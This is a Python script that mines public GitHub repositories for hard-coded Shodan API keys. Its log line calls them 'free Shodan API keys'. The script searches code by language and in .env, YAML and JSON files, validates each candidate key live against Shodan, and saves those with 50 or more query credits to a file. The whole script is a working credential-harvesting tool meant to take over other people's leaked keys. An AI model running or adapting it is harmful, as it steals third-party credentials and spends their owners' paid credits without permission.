import sys
import time
import datetime
import re
import json
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from shodan import Shodan
from github import Github

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("gitshodankey.log"), logging.StreamHandler()]
)

def clean(o):
    ls = []
    keyList = []
    with open(o, 'r+') as f:
        for line in f.readlines():
            if line.split(" ")[0] not in keyList:
                ls.append(line)
                keyList.append(line.split(" ")[0])
    with open(o, 'w') as f:
        for l in ls:
            f.write(l)

def check(k, o):
    if not re.match(r'^[a-zA-Z0-9]{32}$', k):
        return
    try:
        shodan_api = Shodan(k)
        if shodan_api.info()['query_credits'] >= 50:
            logging.info("Valid Key Found: %s (Credits: %d, Scans: %d)", k, shodan_api.info()['query_credits'], shodan_api.info()['scan_credits'])
            with open(o, 'a+') as f:
                f.write(f"{k} Credits: {shodan_api.info()['query_credits']} Scans: {shodan_api.info()['scan_credits']}\n")
    except Exception as e:
        logging.debug("Invalid key or API error for %s: %s", k, str(e))

def save_checkpoint(keyword_file, keyword, page):
    with open("checkpoint.json", "w") as f:
        json.dump({"file": keyword_file, "keyword": keyword, "page": page}, f)

def load_checkpoint():
    try:
        with open("checkpoint.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return None

def search(t, o, k, l, extensions=None):
    tc = 0
    retries = 0
    max_retries = 5
    query = l + k
    if extensions:
        query += f" {extensions}"
    while True:
        try:
            api = Github(t)
            api.per_page = 1
            repos = api.search_code(query)
            tc = repos.totalCount
            break
        except Exception as e:
            if "rate limit" in str(e).lower() and retries < max_retries:
                wait = 2 ** retries * 30
                logging.info(f"Rate limit hit, waiting {wait} seconds...")
                time.sleep(wait)
                retries += 1
            else:
                raise e

    checkpoint = load_checkpoint()
    start_page = 0
    if checkpoint and checkpoint["file"] == keywordFile and checkpoint["keyword"] == k:
        start_page = checkpoint["page"]

    for i in range(start_page, tc):
        save_checkpoint(keywordFile, k, i)
        while True:
            try:
                lines = str(repos.get_page(i)[0].decoded_content, 'utf-8').split("\n")
                for line in lines:
                    original = line
                    line = line.strip().lower().replace(' ', '')
                    if k + '"' in line:
                        split = original.split('"')
                        if len(split[1]) == 32:
                            check(split[1], o)
                    elif k + "'" in line:
                        split = original.split("'")
                        if len(split[1]) == 32:
                            check(split[1], o)
            except Exception as e:
                if "rate limit" in str(e).lower():
                    time.sleep(30)
                    continue
                logging.error("Error processing page %d: %s", i, str(e))
                break
            break

def search_keyword(token, output_file, keyword, language, extensions=None):
    dt = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    query = language + keyword + (f" {extensions}" if extensions else "")
    logging.info("%s - Searching with query: '%s'", dt, query)
    search(token, output_file, keyword, language, extensions)

try:
    if len(sys.argv) != 3:
        logging.error("Usage: gitshodankey.py <github-api-token> <keys.out>")
        exit()

    logging.info("Searching for free Shodan API keys in public GitHub repositories.")
    keywordFiles = [
        "keywords/shodan-python.txt",
        "keywords/shodan-javascript.txt",
        "keywords/shodan-java.txt",
        "keywords/shodan-csharp.txt",
        "keywords/shodan-generic.txt"
    ]

    for keywordFile in keywordFiles:
        if "python" in keywordFile:
            language = "language:python "
            extensions = None
        elif "javascript" in keywordFile:
            language = "language:javascript "
            extensions = None
        elif "java" in keywordFile:
            language = "language:java "
            extensions = None
        elif "csharp" in keywordFile:
            language = "language:csharp "
            extensions = None
        else:
            language = ""
            extensions = "extension:env extension:yaml extension:json"

        keywordList = []
        with open(keywordFile, 'r+') as f:
            for l in f.readlines():
                keywordList.append(l.removesuffix("\n"))

        try:
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(search_keyword, sys.argv[1], sys.argv[2], keyword, language, extensions) for keyword in keywordList]
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        logging.error("Error in thread: %s", str(e))
            clean(sys.argv[2])
        except Exception as e:
            logging.error("Error processing %s: %s", keywordFile, str(e))

except KeyboardInterrupt:
    logging.info("Script interrupted by user.")
    exit()
except Exception as e:
    logging.error("Unexpected error: %s", str(e))
    exit()
